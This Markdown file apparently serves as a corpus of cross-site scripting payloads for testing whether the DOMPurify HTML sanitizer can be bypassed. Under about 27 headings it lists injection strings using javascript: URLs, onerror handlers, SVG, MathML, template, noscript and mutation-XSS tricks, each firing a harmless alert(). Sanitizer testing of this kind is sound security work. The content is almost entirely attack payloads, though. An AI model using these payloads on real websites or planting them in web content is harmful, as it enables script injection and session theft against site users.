# DOMPurify Bypass Attempts

## mXSS through namespace confusion
<svg><image href="javascript:alert('svg-image')" /></svg>

## Mathematical markup injection
<math><mi xlink:href="javascript:alert('math')">click</mi></math>

## Template element bypass
<template><img src="x" onerror="alert('template')" /></template>

## Foreign object injection in SVG
<svg><foreignObject><img src="x" onerror="alert('foreign')" /></foreignObject></svg>

## Mutation XSS through DOM manipulation
<img src="x" id="test" />
<script>document.getElementById('test').src = "javascript:alert('mutation')"</script>

## mXSS with form elements
<form><input name="attributes" value="<img src=x onerror=alert('form')>" /></form>

## HTML5 parser confusion
<img src=`javascript:alert('backtick')`>
<img src='javascript:alert("mixed-quotes")'>

## Custom element injection
<custom-element onclick="alert('custom')">Content</custom-element>

## Shadow DOM bypass attempts
<div><shadow-root><img src="x" onerror="alert('shadow')" /></shadow-root></div>

## XML namespace injection
<img xmlns:x="http://www.w3.org/1999/xhtml" x:href="javascript:alert('namespace')" />

## mXSS with table elements
<table><img src="x" onerror="alert('table-context')" /></table>

## Select option value injection
<select><option value="<img src=x onerror=alert('option')>">Text</option></select>

## Meta tag injection
<meta http-equiv="refresh" content="0;url=javascript:alert('meta')" />

## Link tag injection
<link rel="stylesheet" href="javascript:alert('link')" />

## Base tag injection
<base href="javascript:alert('base')" />

## Object/embed injection
<object data="javascript:alert('object')"></object>
<embed src="javascript:alert('embed')" />

## Video/audio with malicious sources
<video><source src="javascript:alert('video')" /></video>
<audio><source src="javascript:alert('audio')" /></audio>

## iframe source injection
<iframe src="javascript:alert('iframe')"></iframe>

## mXSS with textarea content
<textarea><img src="x" onerror="alert('textarea')" /></textarea>

## Parser confusion with noscript
<noscript><img src="x" onerror="alert('noscript')" /></noscript>

## mXSS through style injection
<style>@import "javascript:alert('style-import')";</style>

## XML entity injection
<!DOCTYPE html [<!ENTITY xxe "javascript:alert('entity')">]>
<img src="&xxe;" />

## Comment-based injection
<!--<img src="x" onerror="alert('comment')" />-->

## Processing instruction injection
<?xml-stylesheet href="javascript:alert('pi')" ?>

## Fragment identifier injection
<img src="data:text/html,<script>alert('fragment')</script>#" />

## mXSS with option selected
<option selected="<img src=x onerror=alert('selected')>">Text</option>